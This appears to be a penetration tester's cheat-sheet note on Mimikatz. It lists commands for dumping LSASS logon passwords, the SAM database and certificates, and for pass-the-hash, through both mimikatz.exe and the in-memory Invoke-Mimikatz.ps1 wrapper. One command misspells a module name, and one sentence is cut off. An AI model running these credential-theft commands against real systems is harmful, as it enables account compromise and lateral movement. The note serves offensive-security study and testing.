
This note does not cover the basics of Windows authentication.  For an overview of local Windows authentication, reference my [Windows Authentication](../Windows%20Authentication.md) note.
## Overview
---
**Mimikatz.exe** is a versatile utility for Windows that can extract and manipulate authentication data, including passwords and cryptographic tokens, from the Windows operating system

> [!info]
> The Mimikatz usage wiki can be found [here](https://github.com/gentilkiwi/mimikatz/wiki).

- The primary method of usage is via the binary.
- An alternative method of usage is via `Invoke-Mimikatz.ps1`

## Usage via ``mimikatz.exe``
---
**Repo Link:** https://github.com/gentilkiwi/mimikatz

- ``mimikatz.exe`` is an incredibly robust and vast tool, so all use cases will not be documented here.
- This covers common use-cases; make sure to reference the tool's wiki for more information.

```powershell
#  Acquire "debug" process privileges if running as an administrator instead of SYSTEM 
./mimikatz.exe "privilege::debug"

# Dump LSASS (non-interactive)
./mimikatz.exe "sekurlsa::logonpasswords exit"

# Dump LSASS from a process dump
./mimikatz.exe "sekurlsa::minidump <lsass>.dmp"
./mimikatz.exe "sekulrsa::logonpasswords"

# Dump the SAM database (requires: SYSTEM)
./mimikatz.exe "lsadump::sam exit"

# Pass-The-Hash using user's NTLM hash (default: /run:cmd)
./mimikatz.exe "sekurlsa::pth /user:<username> /domain:workgroup /ntlm:<hash> exit"
```


## Usage via ``Invoke-Mimikatz.ps1``
---
**Repo Link:** https://github.com/g4uss47/Invoke-Mimikatz

- ``Invoke-Mimikatz.ps1`` is a PowerShell wrapper for Mimikatz that allows it to be loaded into memory and executed entirely from a PowerShell script.
- The script contains base64 strings of both 

```powershell
# Executes: "sekurlsa::logonpasswords exit"
Invoke-Mimikatz -DumpCreds

# Executes: "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
Invoke-Mimikatz -DumpCerts

# Dump the SAM database (requires: SYSTEM)
Invoke-Mimikatz -Command "lsadump::sam"

# Commands with spaces require commenting wrapping quotations
Invoke-Mimikatz -Command "`"lsadump::sam /sam:<hive_path>.hiv`""
```